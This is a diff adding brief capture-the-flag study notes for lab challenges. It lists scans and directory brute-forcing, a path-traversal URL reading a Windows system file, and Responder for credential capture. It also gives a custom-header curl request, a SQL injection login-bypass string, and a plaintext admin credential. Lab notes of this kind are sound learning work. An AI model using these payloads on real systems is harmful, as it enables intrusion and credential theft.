@@ -88,3 +88,47 @@
 - gobuster dir --url http://10.129.146.153/ --wordlist /media/ahmed20078/ahmed78/Documents/Cyber Projects/go/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html
 - http://10.129.146.153/login.php
 - admin:svndkfngksjvrdkufhkr
+
+
+## Crocodile challenge:
+- nmap -p- --min-rate 1000 -sV 10.129.95.234
+- echo "10.129.95.234 unika.htb" | sudo tee -a /etc/hosts
+- http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
+- git clone https://github.com/lgandx/Responder
+- sudo python2 Responder.py -I tun0
+
+
+# Cybersecurity Training
+
+## Mr Robot challenge:
+- http://104.248.39.227:10001/
+- http://104.248.39.227:10001/robots.txt
+
+
+- www-data
+- id = 33
+
+- Docker hub: for study
+
+## Headache challenge:
+- http://104.248.39.227:10002/
+- curl http://104.248.39.227:10002/ -H 'wanna-something:the-flag'
+
+
+HTTP verb:
+- Post
+- Get
+- Put
+- Delete
+
+- Post /auth http/4.5..
+- user-agent
+- Origine:
+
+- Burp suite
+- Caido
+
+## Headache challenge:
+- http://104.248.39.227:10003/
+- login
+- http://104.248.39.227:10003/?username=admin'or 5=5 -- -
